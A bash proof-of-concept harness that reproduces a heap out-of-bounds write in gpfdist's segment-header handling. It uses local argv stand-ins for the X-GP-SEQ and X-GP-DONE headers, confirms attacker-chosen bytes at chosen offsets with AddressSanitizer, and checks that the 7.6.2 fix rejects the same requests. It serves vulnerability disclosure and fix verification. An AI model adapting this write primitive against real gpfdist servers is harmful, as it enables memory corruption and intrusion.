#!/usr/bin/env bash
# Source-bound gpfdist segment-header OOB write harness. All inputs are local
# argv values standing in for HTTP headers; no socket or external system.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ulimit -c 0 2>/dev/null || true
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2

pass=0; fail=0
check() {
  local name=$1 ok=$2
  if [ "$ok" = 1 ]; then echo "PASS $name"; pass=$((pass+1));
  else echo "FAIL $name"; fail=$((fail+1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
yes() { contains "$1" "$2" && echo 1 || echo 0; }

python3 gen_driver.py > "$OUT/gen.log" || exit 2
for t in vuln fixed vuln_asan fixed_asan; do
  src=driver_vuln.c; case $t in fixed*) src=driver_fixed.c;; esac
  flags="-O0 -g -Wall"; case $t in *asan) flags="$flags -fsanitize=address";; esac
  gcc $flags -o "$OUT/$t" "$src" >> "$OUT/build.log" 2>&1 || exit 2
done
V="$OUT/vuln"; F="$OUT/fixed"; VA="$OUT/vuln_asan"; FA="$OUT/fixed_asan"

# Rung 1: one 4-byte array and one 8-byte array, declared count 1, id 1.
r1=$($V rung1 1 1 1)
echo "$r1"
check "rung1 trigger" "$(yes 'rung1 totalsegs=1 segid=1 seq=1 verdict=TRIGGER' "$r1")"

# Rung 2: same logical capacity, mmap collaborator; both indexed writes land
# past their arrays and clobber the stamped slots at byte offsets 12 and 24.
r2=$($V rung2 1 3 1)
echo "$r2"
ok=0
contains 'active_off=12 active=01000000 seq_off=24 seqbytes=0100000000000000' "$r2" && ok=1
check "rung2 both arrays clobbered" "$ok"

# Rung 3: ASan, exact 4-byte and 8-byte allocations.
"$VA" rung1 1 1 1 > "$OUT/asan_active.log" 2>&1
ac=$(cat "$OUT/asan_active.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 4' "$ac" &&
contains 'gpfdist_v7.6.1.c:1988' "$ac" && ok=1
check "rung3 ASan active_segids write at :1988" "$ok"

"$VA" rung3seq 1 2 4702111234474983745 > "$OUT/asan_seq.log" 2>&1
sc=$(cat "$OUT/asan_seq.log")
ok=0
contains 'heap-buffer-overflow' "$sc" &&
contains 'WRITE of size 8' "$sc" &&
contains 'gpfdist_v7.6.1.c:3677' "$sc" && ok=1
check "rung3 ASan seq_segs write at :3677" "$ok"

# Rung 4: attacker-chosen X-GP-SEQ value at a chosen byte offset.
r4=$($V rung4 1 3 4702111234474983745)
echo "$r4"
ok=0
contains 'segid=3 seq=4702111234474983745' "$r4" &&
contains 'active_off=12 active=01000000' "$r4" &&
contains 'seq_off=24 seqbytes=4141414141414141' "$r4" && ok=1
check "rung4 chosen 0x41 bytes at seq+24" "$ok"

# X-GP-DONE switches the 4-byte active_segids write from 1 to 0.
r4d=$($V rung4 1 3 4702111234474983745 1)
ok=0
contains 'active_off=12 active=00000000' "$r4d" && ok=1
check "rung4 done flag writes chosen zero" "$ok"

"$FA" fixed 1 0 1 > "$OUT/fixed_asan.log" 2>&1
"$FA" fixed 1 3 4702111234474983745 > "$OUT/fixed_asan_bad.log" 2>&1
fa=$(cat "$OUT/fixed_asan.log")
fabad=$(cat "$OUT/fixed_asan_bad.log")
ok=0
contains 'outcome=ACCEPTED_IN_BOUNDS' "$fa" &&
contains 'outcome=REJECTED_CREATE' "$fabad" &&
! contains 'AddressSanitizer' "$fa" &&
! contains 'AddressSanitizer' "$fabad" && ok=1
check "fixed ASan clean on both cases" "$ok"
# Benign in-bounds join: no past-end slot is touched.
rb=$($V rung4 1 0 4702111234474983745)
ok=0
contains 'active_off=0' "$rb" && contains 'seq_off=0' "$rb" && ok=1
check "in-bounds control offsets" "$ok"

( "$V" guard 1 3 4702111234474983745 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard-page first OOB write faults" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Fixed tag 7.6.2: both new guards reject the same requests.
fc=$($F fixed 1 3 4702111234474983745)
check "fixed create rejects out-of-range id" "$(yes 'outcome=REJECTED_CREATE' "$fc")"
fj=$($F fixedjoin 1 3 4702111234474983745)
check "fixed join rejects out-of-range id" "$(yes 'outcome=REJECTED_JOIN' "$fj")"
fg=$($F fixed 1 0 1)
check "fixed accepts in-bounds id" "$(yes 'outcome=ACCEPTED_IN_BOUNDS' "$fg")"

# Determinism: two independent five-run groups, chosen bytes at chosen offset.
group() {
  local i
  for i in 1 2 3 4 5; do $V rung4 1 3 4702111234474983745; done | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
